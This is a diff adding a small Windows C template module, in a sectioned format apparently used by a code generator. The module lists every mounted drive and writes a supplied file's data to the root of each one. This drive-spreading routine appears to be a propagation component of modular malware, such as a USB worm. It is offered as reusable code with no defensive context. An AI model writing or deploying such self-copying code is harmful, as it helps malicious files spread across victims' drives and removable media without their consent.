@@ -1,0 +1,41 @@
+#DOC
+Check existant available mounted drives and try to copy the file
+Some code stolen from tenouk
+In vars : filename (IVAR1), filedata (IVAR2), filesize (IVAR3);
+
+#INVAR
+IVAR1, IVAR2, IVAR3
+
+#OTVAR
+
+#INCLUDES
+<windows.h>
+
+#VARS
+DWORD mydrives, char lpBuffer[MAX_PATH], DWORD dtest, int di, char* sdrive, char tdpath[MAX_PATH], FILE *fileptr
+
+#HEADER
+
+#MAIN
+mydrives = MAX_PATH;
+dtest = GetLogicalDriveStrings(mydrives, lpBuffer);
+
+if (dtest > 0 && dtest <= MAX_PATH) {
+
+sdrive = lpBuffer;
+while (*sdrive) {
+
+memset(tdpath, '\0', sizeof(tdpath));
+strcpy(tdpath, sdrive);
+strcat(tdpath, IVAR1);
+
+fileptr = fopen(tdpath, "wb+");
+if (fileptr) {
+fwrite(IVAR2, IVAR3, 1, fileptr);
+fclose(fileptr);
+}
+sdrive = &sdrive[strlen(sdrive)+1];
+}
+}
+
+#FOOTER
